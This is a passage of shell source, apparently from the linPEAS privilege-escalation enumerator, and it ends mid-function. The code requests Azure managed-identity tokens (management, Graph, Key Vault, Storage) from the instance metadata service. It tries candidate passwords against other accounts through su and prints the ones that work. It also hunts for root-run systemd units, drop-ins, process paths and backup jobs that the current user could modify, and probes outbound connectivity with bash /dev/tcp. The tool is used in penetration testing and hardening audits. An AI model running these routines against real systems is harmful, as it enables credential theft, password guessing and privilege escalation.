check_gcp(){
  is_gcp_vm="No"
  is_gcp_function="No"
  if grep -q metadata.google.internal /etc/hosts 2>/dev/null || (curl --connect-timeout 2 metadata.google.internal >/dev/null 2>&1 && [ "$?" -eq "0" ]) || (wget --timeout 2 --tries 1 metadata.google.internal >/dev/null 2>&1 && [ "$?" -eq "0" ]); then
    is_gcp_vm="Yes"
  fi
  # CHeck if /workspace exists
  if [ -d "/workspace" ] && [ -d "/layers" ]; then
    is_gcp_vm="No"
    is_gcp_function="Yes"
  fi
}

check_az_vm(){
  is_az_vm="No"
  # 1. Check if the Azure log directory exists
  if [ -d "/var/log/azure/" ]; then
    is_az_vm="Yes"
  # 2. Check if 'reddog.microsoft.com' is found in /etc/resolv.conf
  elif grep -q "search reddog.microsoft.com" /etc/resolv.conf 2>/dev/null; then
    is_az_vm="Yes"
  else
    # 3. Try querying the Azure Metadata Service for more wide support (e.g. Azure Container Registry tasks need this)
    if type curl >/dev/null 2>&1; then
      meta_response=$(curl -s --max-time 2 \
        "http://169.254.169.254/metadata/identity/oauth2/token")
      if echo "$meta_response" | grep -q "Missing"; then
        is_az_vm="Yes"
      fi
    elif type wget >/dev/null 2>&1; then
      meta_response=$(wget -qO- --timeout=2 \
        "http://169.254.169.254/metadata/identity/oauth2/token")
      if echo "$meta_response" | grep -q "Missing"; then
        is_az_vm="Yes"
      fi
    fi
  fi
}

set_azure_request_command() {
  az_req=""
  if [ "$(command -v curl || echo -n '')" ]; then
      az_req="curl -s -f -L -H '$HEADER'"
  elif [ "$(command -v wget || echo -n '')" ]; then
      az_req="wget -q -O - --header '$HEADER'"
  else
      echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  fi
}
print_azure_identity_token() {
  print_3title "$1" "T1552.005,T1580"
  exec_with_jq eval $az_req "$IDENTITY_ENDPOINT?api-version=$API_VERSION\\&resource=$2"
  echo
}
print_azure_standard_identity_tokens() {
  print_azure_identity_token "Management token" "https://management.azure.com/"
  print_azure_identity_token "Graph token" "https://graph.microsoft.com/"
  print_azure_identity_token "Vault token" "https://vault.azure.net/"
  print_azure_identity_token "Storage token" "https://storage.azure.com/"
}

pgbb_mount_options() {
  [ -r /proc/mounts ] || return 1
  awk -v path="$1" '
    $2 !~ /\\\\/ && (path == $2 || $2 == "/" || index(path, $2 "/") == 1) {
      if (length($2) > best) { best=length($2); opts=$4 }
    }
    END { if (best) print opts }
  ' /proc/mounts
}

check_az_app(){
  is_az_app="No"
  if [ -d "/opt/microsoft" ] && env | grep -iq "azure"; then
    is_az_app="Yes"
  fi
  if [ -n "$IDENTITY_ENDPOINT" ] && echo "$IDENTITY_ENDPOINT" | grep -q "/token" && [ -n "$IDENTITY_HEADER" ]; then
    is_az_app="Yes"
  fi
}

checkSystemdWritableExecPaths() {
  [ "$(uname -s 2>/dev/null)" = "Linux" ] || return 0
  [ -z "${IAMROOT:-}" ] || return 0
  command -v systemctl >/dev/null 2>&1 || return 0
  # Active units provide the strongest signal: their configured executable is
  # already trusted by PID 1 and is likely to be invoked again on restart.
  sdwed_units="$(systemctl list-units --type=service --state=active --no-legend --no-pager 2>/dev/null |
    awk '$1 ~ /\.service$/ { print $1 }' | head -n 200)"
  [ -n "$sdwed_units" ] || return 0
  sdwed_findings=""
  for sdwed_unit in $sdwed_units; do
    sdwed_properties="$(systemctl show "$sdwed_unit" \
      -p User -p DynamicUser -p RootImage -p RootDirectory \
      -p ExecStartPre -p ExecStart -p ExecStartPost -p ExecReload \
      -p ExecStop -p ExecStopPost 2>/dev/null)"
    sdwed_user="$(printf '%s\n' "$sdwed_properties" | sed -n 's/^User=//p' | head -n 1)"
    case "$sdwed_user" in
      ""|root|0) ;;
      *) continue ;;
    esac
    sdwed_dynamic_user="$(printf '%s\n' "$sdwed_properties" | sed -n 's/^DynamicUser=//p' | head -n 1)"
    if [ -z "$sdwed_user" ] && [ "$sdwed_dynamic_user" = "yes" ]; then
      continue
    fi
    # RootImage paths are not ordinary host paths. Avoid guessing whether a
    # writable host directory maps into the image and producing a false alert.
    sdwed_root_image="$(printf '%s\n' "$sdwed_properties" | sed -n 's/^RootImage=//p' | head -n 1)"
    [ -z "$sdwed_root_image" ] || continue
    sdwed_root_dir="$(printf '%s\n' "$sdwed_properties" | sed -n 's/^RootDirectory=//p' | head -n 1)"
    sdwed_exec_records="$(printf '%s\n' "$sdwed_properties" |
      awk '
        {
          sdwed_rest = $0
          while (match(sdwed_rest, /path=[^ ;}]*/)) {
            print substr(sdwed_rest, RSTART + 5, RLENGTH - 5)
            sdwed_rest = substr(sdwed_rest, RSTART + RLENGTH)
          }
        }
      ' | sort -u)"
    for sdwed_exec in $sdwed_exec_records; do
      case "$sdwed_exec" in
        /*) ;;
        *) continue ;;
      esac
      if [ -n "$sdwed_root_dir" ] && [ "$sdwed_root_dir" != "/" ]; then
        sdwed_exec_host="${sdwed_root_dir%/}${sdwed_exec}"
      else
        sdwed_exec_host="$sdwed_exec"
      fi
      sdwed_exec_parent="${sdwed_exec_host%/*}"
      [ -n "$sdwed_exec_parent" ] || sdwed_exec_parent="/"
      [ -d "$sdwed_exec_parent" ] || continue
      [ -w "$sdwed_exec_parent" ] && [ -x "$sdwed_exec_parent" ] || continue
      # In a sticky directory, a user cannot replace somebody else's existing
      # entry despite being able to create files alongside it.
      if [ -k "$sdwed_exec_parent" ] && [ -e "$sdwed_exec_host" ] && ! [ -O "$sdwed_exec_host" ]; then
        continue
      fi
      if [ -z "$sdwed_findings" ]; then
        print_3title "Root systemd service executables replaceable through writable directories" "T1543.002,T1574.010"
        print_info "https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html#User="
        sdwed_findings="found"
      fi
      echo "$sdwed_unit: $sdwed_exec_host (writable parent: $sdwed_exec_parent)" |
        sed -${E} "s,.*,${SED_RED_YELLOW},"
      ls -ld "$sdwed_exec_parent" "$sdwed_exec_host" 2>/dev/null
    done
  done
  [ -z "$sdwed_findings" ] || echo ""
}

checkSystemdWritableDropins() {
  [ "$(uname -s 2>/dev/null)" = "Linux" ] || return 0
  [ -z "${IAMROOT:-}" ] || return 0
  [ "$(id -u 2>/dev/null)" != "0" ] || return 0
  command -v systemctl >/dev/null 2>&1 || return 0
  # Optional directory arguments let tests use fixtures without touching
  # the host's systemd tree. Normal calls inspect fixed systemd paths only.
  sdwdd_system_dir=${1:-/etc/systemd/system}
  sdwdd_runtime_dir=${2:-/run/systemd/system}
  [ -d "$sdwdd_system_dir" ] || return 0
  # A user may create a new unit even without directory read permission.
  # This is only a lead until a privileged manager loads and starts that unit.
  if [ -d "$sdwdd_runtime_dir" ] && [ ! -L "$sdwdd_system_dir" ] &&
     [ -w "$sdwdd_system_dir" ] && [ -x "$sdwdd_system_dir" ]; then
    print_3title "Writable systemd system unit directory" "T1543.002"
    print_info "https://book.hacktricks.wiki/en/linux-hardening/interesting-files-permissions/write-to-root.html#service--socket-files"
    echo "$sdwdd_system_dir is writable and searchable; verify effective sudo start/restart policy, unit loading, and service identity before treating a new unit as executable" |
      sed -"${E}" "s,.*,${SED_RED_YELLOW},"
    echo ""
  fi
  command -v timeout >/dev/null 2>&1 || return 0
  sdwdd_checked=0
  sdwdd_found=""
  for sdwdd_dir in "$sdwdd_system_dir"/*.service.d; do
    [ -d "$sdwdd_dir" ] && [ ! -L "$sdwdd_dir" ] || continue
    [ -w "$sdwdd_dir" ] && [ -x "$sdwdd_dir" ] || continue
    # A writable directory can accept a new .conf even if it is empty and
    # every existing unit file is protected. Bound systemctl to 20 candidates.
    [ "$sdwdd_checked" -lt 20 ] || break
    sdwdd_checked=$((sdwdd_checked + 1))
    sdwdd_unit=${sdwdd_dir##*/}
    sdwdd_unit=${sdwdd_unit%.d}
    sdwdd_properties=$(timeout -k 1 2 systemctl show \
      -p LoadState -p ActiveState -p User -p DynamicUser \
      -p RootDirectory -p RootImage -p PrivateUsers \
      -- "$sdwdd_unit" 2>/dev/null) || continue
    sdwdd_active=""
    sdwdd_loaded=""
    sdwdd_user=""
    sdwdd_user_seen=""
    sdwdd_dynamic_user=""
    sdwdd_root_dir=""
    sdwdd_root_image=""
    sdwdd_private_users=""
    while IFS= read -r sdwdd_property; do
      case "$sdwdd_property" in
        ActiveState=*) sdwdd_active=${sdwdd_property#ActiveState=} ;;
        LoadState=*) sdwdd_loaded=${sdwdd_property#LoadState=} ;;
        User=*) sdwdd_user=${sdwdd_property#User=}; sdwdd_user_seen=1 ;;
        DynamicUser=*) sdwdd_dynamic_user=${sdwdd_property#DynamicUser=} ;;
        RootDirectory=*) sdwdd_root_dir=${sdwdd_property#RootDirectory=} ;;
        RootImage=*) sdwdd_root_image=${sdwdd_property#RootImage=} ;;
        PrivateUsers=*) sdwdd_private_users=${sdwdd_property#PrivateUsers=} ;;
      esac
    done <<EOF
$sdwdd_properties
EOF
    [ "$sdwdd_loaded" = "loaded" ] && [ "$sdwdd_active" = "active" ] || continue
    [ -n "$sdwdd_user_seen" ] || continue
    case "$sdwdd_user" in ""|root|0) ;; *) continue ;; esac
    [ "$sdwdd_dynamic_user" != "yes" ] || continue
    [ -z "$sdwdd_root_dir" ] && [ -z "$sdwdd_root_image" ] || continue
    [ "$sdwdd_private_users" != "yes" ] || continue
    if [ -z "$sdwdd_found" ]; then
      print_3title "Writable systemd drop-in directories for active root services" "T1543.002"
      print_info "https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#services"
      sdwdd_found=1
    fi
    echo "$sdwdd_unit: $sdwdd_dir (a new .conf could run on a later reload and restart)" |
      sed -"${E}" "s,.*,${SED_RED_YELLOW},"
    ls -ld "$sdwdd_dir" 2>/dev/null
  done
  [ -z "$sdwdd_found" ] || echo ""
}

# Inspect literal includes in root PHP consumers. Do not follow dynamic
# expressions, symlinks, parent traversal, or more than four consumers and
# eight 8 KiB source prefixes per document root.
rwpp_php_literal_includes() (
  rwpp_php_base=$1
  rwpp_php_script=$2
  rwpp_php_pid=$3
  case "$rwpp_php_base:$rwpp_php_script" in *[!A-Za-z0-9_./:-]*) exit 0 ;; esac
  case "$rwpp_php_base:$rwpp_php_script" in *'//'*|*'/./'*|*'/../'*|*'/.'|*'/..') exit 0 ;; esac
  [ -f "$rwpp_php_script" ] && [ -r "$rwpp_php_script" ] || exit 0
  [ -L "$rwpp_php_script" ] && exit 0
  rwpp_php_lines=$(LC_ALL=C dd if="$rwpp_php_script" bs=8192 count=1 2>/dev/null | sed -n '1,64p' |
    sed -nE "s/^[[:space:]]*(include|include_once|require|require_once)[[:space:]]*\\(?[[:space:]]*['\"]([A-Za-z0-9_./-]+\\.php)['\"][[:space:]]*\\)?[[:space:]]*;.*/\\2/p" |
    sed -n '1,4p')
  [ -n "$rwpp_php_lines" ] || exit 0
  rwpp_php_found=0
  for rwpp_php_relative in $rwpp_php_lines; do
    case "$rwpp_php_relative" in *'//'*|*'/./'*|*'/../'*|*'/.'|*'/..'|/*) continue ;; esac
    rwpp_php_target=${rwpp_php_script%/*}/$rwpp_php_relative
    [ -f "$rwpp_php_target" ] && [ -w "$rwpp_php_target" ] || continue
    rwpp_php_walk=''
    rwpp_php_rest=${rwpp_php_target#/}
    rwpp_php_safe=1
    while [ -n "$rwpp_php_rest" ]; do
      rwpp_php_part=${rwpp_php_rest%%/*}
      rwpp_php_walk=$rwpp_php_walk/$rwpp_php_part
      if [ -L "$rwpp_php_walk" ]; then rwpp_php_safe=0; break; fi
      case "$rwpp_php_rest" in */*) rwpp_php_rest=${rwpp_php_rest#*/} ;; *) rwpp_php_rest='' ;; esac
    done
    [ "$rwpp_php_safe" -eq 1 ] || continue
    printf 'PID %s: root PHP source %s includes writable PHP file %s (literal path; execution path and access policy require review)\n' \
      "$rwpp_php_pid" "$rwpp_php_script" "$rwpp_php_target"
    rwpp_php_found=$((rwpp_php_found + 1))
    [ "$rwpp_php_found" -lt 2 ] || break
  done
)
checkRootWritableProcessPaths() {
  [ "$(uname -s 2>/dev/null)" = Linux ] || return 0
  rwpp_uid=$(id -u 2>/dev/null) || return 0
  [ "$rwpp_uid" != 0 ] || return 0
  rwpp_proc_root=${1:-/proc}
  [ -d "$rwpp_proc_root" ] || return 0
  rwpp_seen=0
  rwpp_found=0
  rwpp_php_seen=0
  for rwpp_entry in "$rwpp_proc_root"/[0-9]*; do
    [ -d "$rwpp_entry" ] || continue
    rwpp_pid=${rwpp_entry##*/}
    case "$rwpp_pid" in *[!0-9]*|'') continue ;; esac
    rwpp_seen=$((rwpp_seen + 1))
    [ "$rwpp_seen" -le 200 ] || break
    [ -r "$rwpp_entry/status" ] && [ -r "$rwpp_entry/cmdline" ] || continue
    rwpp_effective_uid=$(awk '$1 == "Uid:" { print $3; exit }' "$rwpp_entry/status" 2>/dev/null)
    [ "$rwpp_effective_uid" = 0 ] || continue
    # od preserves NUL argument boundaries. Reading 1025 bytes lets awk reject
    # a truncated command instead of interpreting an incomplete script operand.
    while IFS='|' read -r rwpp_kind rwpp_path rwpp_cmd; do
      case "$rwpp_kind" in
        phpdocroot)
          [ "$rwpp_php_seen" -lt 4 ] && [ -d "$rwpp_path" ] && [ ! -L "$rwpp_path" ] || continue
          rwpp_php_seen=$((rwpp_php_seen + 1))
          find "$rwpp_path" -maxdepth 1 -type f -name '*.php' -print 2>/dev/null | head -n 8 |
          while IFS= read -r rwpp_php_script; do
            rwpp_php_literal_includes "$rwpp_path" "$rwpp_php_script" "$rwpp_pid"
          done
          continue ;;
        phpscript)
          [ "$rwpp_php_seen" -lt 4 ] || continue
          rwpp_php_seen=$((rwpp_php_seen + 1))
          rwpp_php_literal_includes "${rwpp_path%/*}" "$rwpp_path" "$rwpp_pid"
          continue ;;
      esac
      [ -f "$rwpp_path" ] || continue
      rwpp_reason=''
      if [ -w "$rwpp_path" ]; then
        rwpp_reason='file writable'
      fi
      rwpp_parent=${rwpp_path%/*}
      [ -n "$rwpp_parent" ] || rwpp_parent=/
      if [ -d "$rwpp_parent" ] && [ -w "$rwpp_parent" ] && [ -x "$rwpp_parent" ]; then
        # For sticky directories either the directory or the entry must belong
        # to the caller. stat without -L gets the entry owner for symlinks.
        if [ -k "$rwpp_parent" ]; then
          rwpp_parent_uid=$(stat -Lc '%u' "$rwpp_parent" 2>/dev/null)
          rwpp_entry_uid=$(stat -c '%u' "$rwpp_path" 2>/dev/null)
          if [ "$rwpp_parent_uid" = "$rwpp_uid" ] || [ "$rwpp_entry_uid" = "$rwpp_uid" ]; then
            rwpp_reason="${rwpp_reason:+$rwpp_reason; }parent allows replacement"
          fi
        else
          rwpp_reason="${rwpp_reason:+$rwpp_reason; }parent allows replacement"
        fi
      fi
      [ -n "$rwpp_reason" ] || continue
      if [ "$rwpp_found" -eq 0 ]; then
        print_3title 'Observed UID 0 process paths modifiable by current user' 'T1574'
      fi
      printf 'PID %s: %s | %s: %s (%s)\n' "$rwpp_pid" "$rwpp_cmd" "$rwpp_kind" "$rwpp_path" "$rwpp_reason"
      rwpp_found=$((rwpp_found + 1))
      [ "$rwpp_found" -lt 12 ] || break
    done <<EOF
$(dd if="$rwpp_entry/cmdline" bs=1025 count=1 2>/dev/null | od -An -v -tu1 | awk '
  {
    for (i = 1; i <= NF; i++) {
      byte = $i + 0; count++
      if (count > 1024) invalid = 1
      if (byte == 0) {
        argc++; arg[argc] = current; current = ""; ended = 1
      } else {
        ended = 0
        if (byte < 32 || byte > 126) invalid = 1
        current = current sprintf("%c", byte)
      }
    }
  }
  END {
    if (invalid || !ended || !argc) exit
    exe = arg[1]
    name = exe; sub(/^.*\//, "", name)
    command = exe
    for (i = 2; i <= argc && i <= 3; i++) command = command " " arg[i]
    gsub(/\|/, "?", command)
    if (exe ~ /^\// && exe !~ /\|/) print "executable|" exe "|" command
    if (name == "php" && exe ~ /^\//) {
      if (arg[2] == "-S" && arg[4] == "-t" && arg[5] ~ /^\/[A-Za-z0-9_.\/-]+$/)
        print "phpdocroot|" arg[5] "|" command
      else if (arg[2] == "-f" && arg[3] ~ /^\/[A-Za-z0-9_.\/-]+\.php$/)
        print "phpscript|" arg[3] "|" command
      else if (arg[2] ~ /^\/[A-Za-z0-9_.\/-]+\.php$/)
        print "phpscript|" arg[2] "|" command
    }
    if (name ~ /^(sh|bash|dash|ash|ksh|zsh|perl|ruby|php)$/ || name ~ /^python([23]([.][0-9]+)?)?$/) {
      i = 2
      if (arg[i] == "--") i++
      if (arg[i] ~ /^\// && arg[i] !~ /\|/) print "script|" arg[i] "|" command
    }
  }')
EOF
    [ "$rwpp_found" -lt 12 ] || break
  done
  [ "$rwpp_found" -eq 0 ] || echo ''
}

print_ps(){
  (ls -d /proc/*/ 2>/dev/null | while read -r f; do
    CMDLINE=$(tr '\000' ' ' < "$f/cmdline" 2>/dev/null | grep -av "seds,"); #Delete my own sed processess
    if [ "$CMDLINE" ];
      then USER2=$(ls -ld "$f" 2>/dev/null | awk '{print $3}'); PID=$(echo "$f" | cut -d "/" -f3);
      printf "  %-13s  %-8s  %s\n" "$USER2" "$PID" "$CMDLINE";
    fi;
  done) 2>/dev/null | sort -r
}

pgbb_metadata() {
  stat -c '%u %a' "$1" 2>/dev/null || stat -f '%u %Lp' "$1" 2>/dev/null
}
pgbb_literal_path() {
  [ "${#1}" -le 512 ] || return 1
  case "$1" in
    /*) case "$1" in *[!a-zA-Z0-9_./+-]*|*//*|*/../*|*/./*|*/..|*/.) return 1;; esac ;;
    *) return 1 ;;
  esac
  pgbb_path=$1
  pgbb_depth=0
  while [ "$pgbb_path" != / ]; do
    pgbb_depth=$((pgbb_depth + 1))
    [ "$pgbb_depth" -le 32 ] || return 1
    pgbb_path=${pgbb_path%/*}
    [ -n "$pgbb_path" ] || pgbb_path=/
  done
  return 0
}
pgbb_no_symlinks() {
  pgbb_path=$1
  while [ "$pgbb_path" != / ] && [ "${pgbb_path%/}" != "$pgbb_path" ]; do pgbb_path=${pgbb_path%/}; done
  while [ "$pgbb_path" != / ]; do
    [ ! -L "$pgbb_path" ] || return 1
    pgbb_path=${pgbb_path%/*}
    [ -n "$pgbb_path" ] || pgbb_path=/
  done
}
pgbb_parse_command() (
  case "$1" in
    *\$*|*\`*|*\;*|*\&*|*\|*|*\(*|*\)*|*\<*|*\>*|*\\*|*\"*|*\'*|*\**|*\?*|*\[*|*\]*) return 1 ;;
  esac
  set -f
  set -- $1
  [ "$1" = exec ] && shift
  case "$1" in /usr/bin/pg_basebackup|/usr/local/bin/pg_basebackup|pg_basebackup) shift ;; *) return 1 ;; esac
  pgbb_dest=
  pgbb_host=
  while [ "$#" -gt 0 ]; do
    case "$1" in
      -D|--pgdata) shift; [ "$#" -gt 0 ] || return 1; [ -z "$pgbb_dest" ] || return 1; pgbb_dest=$1 ;;
      --pgdata=*) [ -z "$pgbb_dest" ] || return 1; pgbb_dest=${1#*=} ;;
      -h|--host) shift; [ "$#" -gt 0 ] || return 1; [ -z "$pgbb_host" ] || return 1; pgbb_host=$1 ;;
      --host=*) [ -z "$pgbb_host" ] || return 1; pgbb_host=${1#*=} ;;
      -d|--dbname|--dbname=*) return 1 ;;
      -F|--format) shift; [ "$1" = p ] || [ "$1" = plain ] || return 1 ;;
      --format=plain|--format=p) ;;
      -Fp) ;;
      -F*|--format=*) return 1 ;;
      -D*) return 1 ;;
    esac
    shift
  done
  [ -n "$pgbb_dest" ] || return 1
  pgbb_literal_path "$pgbb_dest" || return 1
  pgbb_literal_path "$pgbb_host" || return 1
  while [ "$pgbb_dest" != / ] && [ "${pgbb_dest%/}" != "$pgbb_dest" ]; do pgbb_dest=${pgbb_dest%/}; done
  [ "$pgbb_dest" != / ] || return 1
  printf '%s\n' "$pgbb_dest"
)
pgbb_source_from_process() {
  ps -eo args 2>/dev/null | awk '
    NR > 256 { exit }
    { for (i=1; i<NF-1; i++) if ($i ~ /(^|\/)postgres$/ && $(i+1)=="-D" && $(i+2) ~ /^\/[a-zA-Z0-9_.\/+\-]+$/) { found++; source=$(i+2) } }
    END { if (found == 1) print source }
  '
}
pgbb_review_job() {
  pgbb_cron=$1
  pgbb_command=$2
  pgbb_source=$3
  pgbb_dest=$(pgbb_parse_command "$pgbb_command") || {
    printf 'PostgreSQL base-backup review lead: %s: literal plain destination could not be established\n' "$pgbb_cron"
    return 0
  }
  pgbb_literal_path "$pgbb_source" || return 0
  pgbb_no_symlinks "$pgbb_source" || return 0
  pgbb_no_symlinks "$pgbb_dest" || {
    printf 'PostgreSQL base-backup review lead: %s: destination contains a symlink\n' "$pgbb_cron"
    return 0
  }
  [ -d "$pgbb_source" ] && [ -w "$pgbb_source" ] && [ -x "$pgbb_source" ] || return 0
  pgbb_source_meta=$(pgbb_metadata "$pgbb_source") || return 0
  pgbb_parent=$pgbb_dest
  if [ -d "$pgbb_dest" ]; then
    [ -x "$pgbb_dest" ] && [ ! -w "$pgbb_dest" ] || return 0
    pgbb_dest_meta=$(pgbb_metadata "$pgbb_dest") || return 0
  elif [ ! -e "$pgbb_dest" ]; then
    pgbb_parent=${pgbb_dest%/*}
    [ -n "$pgbb_parent" ] || pgbb_parent=/
    [ -d "$pgbb_parent" ] && [ -x "$pgbb_parent" ] && [ ! -w "$pgbb_parent" ] || return 0
    pgbb_dest_meta=$(pgbb_metadata "$pgbb_parent") || return 0
    [ "${pgbb_dest_meta%% *}" = 0 ] || return 0
    printf 'PostgreSQL base-backup review lead: %s: output does not exist; resulting directory mode cannot be confirmed\n' "$pgbb_cron"
    return 0
  else
    return 0
  fi
  [ "${pgbb_dest_meta%% *}" = 0 ] || return 0
  pgbb_path=$pgbb_parent
  while [ "$pgbb_path" != / ]; do
    [ -x "$pgbb_path" ] || return 0
    pgbb_path=${pgbb_path%/*}
    [ -n "$pgbb_path" ] || pgbb_path=/
  done
  pgbb_opts=$(pgbb_mount_options "$pgbb_dest")
  case ",$pgbb_opts," in
    ,,) printf 'PostgreSQL base-backup review lead: %s: destination mount options unknown\n' "$pgbb_cron"; return 0 ;;
    *,nosuid,*|*,noexec,*|*,ro,*) return 0 ;;
  esac
  case ",$pgbb_opts," in *,rw,*) : ;; *) return 0 ;; esac
  printf 'PostgreSQL base-backup review candidate: %s\n' "$pgbb_cron"
  printf '  command: %s\n  writable source: %s (uid mode %s)\n  root output: %s (uid mode %s; mount %s)\n' "$pgbb_command" "$pgbb_source" "$pgbb_source_meta" "$pgbb_dest" "$pgbb_dest_meta" "$pgbb_opts"
  printf '  reason: root plain-format backup may copy lower-trust files and set-ID modes into an executable path; verify mode preservation\n'
  PG_BASEBACKUP_DESTS="${PG_BASEBACKUP_DESTS}${PG_BASEBACKUP_DESTS:+
}$pgbb_dest"
}
pgbb_scan_file() {
  pgbb_file=$1
  pgbb_source=$2
  [ -f "$pgbb_file" ] && [ -r "$pgbb_file" ] && [ ! -L "$pgbb_file" ] && [ ! -w "$pgbb_file" ] || return 0
  pgbb_meta=$(pgbb_metadata "$pgbb_file") || return 0
  [ "${pgbb_meta%% *}" = 0 ] || return 0
  pgbb_size=$(stat -c %s "$pgbb_file" 2>/dev/null || stat -f %z "$pgbb_file" 2>/dev/null) || return 0
  case "$pgbb_size" in ''|*[!0-9]*) return 0 ;; esac
  [ "$pgbb_size" -le 65536 ] || return 0
  pgbb_line_count=0
  while IFS= read -r pgbb_line; do
    pgbb_line_count=$((pgbb_line_count + 1))
    [ "$pgbb_line_count" -le 200 ] || break
    [ "${#pgbb_line}" -le 1024 ] || continue
    case "$pgbb_line" in ''|\#*|[[:space:]]\#*) continue ;; esac
    pgbb_total=$((pgbb_total + 1))
    [ "$pgbb_total" -le 400 ] || return 0
    set -f
    set -- $pgbb_line
    set +f
    case "$pgbb_file" in
      */cron.d/*|/etc/crontab) [ "$#" -ge 7 ] && [ "$6" = root ] || continue; shift 6 ;;
      */crontabs/root|*/cron/root) [ "$#" -ge 6 ] || continue; shift 5 ;;
      /etc/anacrontab) [ "$#" -ge 4 ] || continue; shift 3 ;;
      *) continue ;;
    esac
    pgbb_command="$*"
    case "$pgbb_command" in *pg_basebackup*) : ;; *)
      set -- $pgbb_command
      case "$1" in /bin/sh|/bin/bash|/usr/bin/sh|/usr/bin/bash) shift ;; esac
      [ "$#" -eq 1 ] || continue
      pgbb_wrapper=$1
      pgbb_literal_path "$pgbb_wrapper" || continue
      pgbb_no_symlinks "$pgbb_wrapper" || continue
      [ -f "$pgbb_wrapper" ] && [ -r "$pgbb_wrapper" ] && [ ! -L "$pgbb_wrapper" ] && [ ! -w "$pgbb_wrapper" ] || continue
      pgbb_meta=$(pgbb_metadata "$pgbb_wrapper") || continue
      [ "${pgbb_meta%% *}" = 0 ] || continue
      pgbb_size=$(stat -c %s "$pgbb_wrapper" 2>/dev/null || stat -f %z "$pgbb_wrapper" 2>/dev/null) || continue
      case "$pgbb_size" in ''|*[!0-9]*) continue ;; esac
      [ "$pgbb_size" -le 8192 ] || continue
      pgbb_command=$(head -c 8192 "$pgbb_wrapper" 2>/dev/null | awk 'NR<=80 && /(^|[[:space:]\/])pg_basebackup([[:space:]]|$)/ { print; exit }')
      [ -n "$pgbb_command" ] || continue
      ;;
    esac
    pgbb_count=$((pgbb_count + 1))
    [ "$pgbb_count" -le 20 ] || return 0
    pgbb_review_job "$pgbb_file:$pgbb_line_count" "$pgbb_command" "$pgbb_source"
  done < "$pgbb_file"
}
pgbb_scan_files() {
  pgbb_source=$1
  shift
  pgbb_count=0
  pgbb_total=0
  pgbb_file_count=0
  for pgbb_file do
    pgbb_file_count=$((pgbb_file_count + 1))
    [ "$pgbb_file_count" -le 64 ] || break
    pgbb_scan_file "$pgbb_file" "$pgbb_source"
    [ "$pgbb_count" -lt 20 ] && [ "$pgbb_total" -lt 400 ] || break
  done
}
check_pg_basebackup_boundary() {
  [ "$(id -u 2>/dev/null)" != 0 ] || return 0
  pgbb_source=$(pgbb_source_from_process)
  [ -n "$pgbb_source" ] || return 0
  pgbb_scan_files "$pgbb_source" /etc/crontab /var/spool/cron/crontabs/root /var/spool/cron/root /etc/anacrontab /etc/cron.d/*
}

su_try_pwd(){
  BFUSER=$1
  PASSWORDTRY=$2
  trysu=$(echo "$PASSWORDTRY" | timeout 1 su $BFUSER -c whoami 2>/dev/null)
    if [ $? -eq 0 ]; then
    echo "  You can login as $BFUSER using password: $PASSWORDTRY" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  fi
}

check_tcp_443_bin () {
  local TIMEOUT_INTERNET_SECONDS_443_BIN=$1
  local url_443="https://1.1.1.1"
  if command -v curl >/dev/null 2>&1; then
    if curl -s -k --connect-timeout "$TIMEOUT_INTERNET_SECONDS_443_BIN" "$url_443" >/dev/null 2>&1
    then
      echo "Port 443 is accessible with curl"
      return 0                      # ✅ success
    else
      echo "Port 443 is not accessible with curl"
      return 1
    fi
  elif command -v wget >/dev/null 2>&1; then
    if wget -q --no-check-certificate --timeout="$TIMEOUT_INTERNET_SECONDS_443_BIN" -O - "$url_443" >/dev/null 2>&1
    then
      echo "Port 443 is accessible with wget"
      return 0
    else
      echo "Port 443 is not accessible with wget"
      return 1
    fi
  else
    echo "Neither curl nor wget available"
    return 1
  fi
}

check_tcp_443(){
  local TIMEOUT_INTERNET_SECONDS_443=$1
  if ! [ -f "/bin/bash" ]; then
    echo "  /bin/bash not found"
    return
  fi
  # example.com
  (bash -c '(echo >/dev/tcp/104.18.74.230/443 2>/dev/null && echo "Port 443 is accessible" && exit 0) 2>/dev/null || echo "Port 443 is not accessible"') & local_pid=$!
  sleep $TIMEOUT_INTERNET_SECONDS_443 && kill -9 $local_pid 2>/dev/null && echo "Port 443 is not accessible"
}

linpeas_json_escape(){
  printf "%s" "$1" | sed 's/\\/\\\\/g; s/"/\\"/g; s/	/ /g'
}
linpeas_os_release_field(){
  [ -r /etc/os-release ] || return
  awk -F= -v key="$1" '
    $1 == key {
      value=$0
      sub(/^[^=]*=/, "", value)
      gsub(/^"/, "", value)
      gsub(/"$/, "", value)
      print value
      exit
    }
  ' /etc/os-release 2>/dev/null
}
linpeas_os_package_ecosystem(){
  _os_id="$(linpeas_os_release_field ID)"
  _os_version_id="$(linpeas_os_release_field VERSION_ID)"
  _os_version_major="$(printf "%s" "$_os_version_id" | cut -d. -f1)"
  case "$_os_id" in
    debian)  [ "$_os_version_major" ] && printf "Debian:%s" "$_os_version_major" ;;
    ubuntu)  [ "$_os_version_id" ] && printf "Ubuntu:%s" "$_os_version_id" ;;
    alpine)  [ "$_os_version_id" ] && printf "Alpine:v%s" "$_os_version_id" ;;
    fedora)  [ "$_os_version_id" ] && printf "Fedora:%s" "$_os_version_id" ;;
    amzn)    [ "$_os_version_id" ] && printf "Amazon Linux:%s" "$_os_version_id" ;;
    rhel)    [ "$_os_version_major" ] && printf "Red Hat:%s" "$_os_version_major" ;;
    centos)  [ "$_os_version_major" ] && printf "CentOS:%s" "$_os_version_major" ;;
    rocky)   [ "$_os_version_major" ] && printf "Rocky Linux:%s" "$_os_version_major" ;;
    almalinux) [ "$_os_version_major" ] && printf "AlmaLinux:%s" "$_os_version_major" ;;
  esac
}
linpeas_tabbed_packages_to_json_lines(){
  awk -F '\t' -v manager="$1" -v ecosystem="$2" '
    function esc(s) { gsub(/\\/,"\\\\",s); gsub(/"/,"\\\"",s); gsub(/\r/," ",s); return s }
    $1 != "" && $2 != "" {
      key=$1 "|" $2
      if (seen[key]++) next
      printf "{\"name\":\"%s\",\"version\":\"%s\",\"ecosystem\":\"%s\",\"manager\":\"%s\"}\n", esc($1), esc($2), esc(ecosystem), manager
    }'
}
linpeas_print_package_json_lines(){
  _ecosystem="$(linpeas_os_package_ecosystem)"
  if command -v dpkg-query >/dev/null 2>&1; then
    dpkg-query -W -f='${source:Package}\t${source:Version}\t${binary:Package}\t${Version}\n' 2>/dev/null | awk -F '\t' '
      {
        name=$1; version=$2
